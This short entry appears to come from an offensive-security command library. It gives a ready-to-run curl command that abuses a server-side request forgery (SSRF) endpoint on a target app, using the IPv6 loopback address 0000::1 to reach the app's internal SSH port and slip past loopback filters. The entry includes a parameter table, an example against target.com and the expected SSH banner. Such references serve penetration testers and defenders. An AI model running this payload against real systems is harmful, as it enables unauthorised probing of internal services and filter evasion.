---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:22/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - ssh
verified: true
validated: true
---

# access-internal-ssh-via-ssrf-ipv6-loopback

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:22/"
```

## Description

SSRF to internal SSH using 0000::1.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable app URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[0000::1]:22/"
```

## Expected Output

SSH banner.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
